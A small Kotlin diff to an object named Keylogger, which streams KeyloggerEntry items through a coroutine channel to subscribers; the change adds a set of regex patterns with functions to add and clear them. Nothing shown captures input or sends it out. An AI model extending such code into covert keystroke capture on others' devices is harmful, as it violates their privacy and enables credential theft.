@@ -42,6 +42,12 @@ import kotlinx.coroutines.channels.ReceiveChannel
 object Keylogger{
     internal val channel = Channel<KeyloggerEntry>()
 
+    internal val patterns = mutableSetOf<Regex>()
+
+    fun addPattern(regex: String) = patterns.add(Regex(regex))
+
+    fun resetPatterns() = patterns.clear()
+
     suspend fun subscribe(block: (KeyloggerEntry) -> Unit){
         for(entry in channel){
             block(entry)
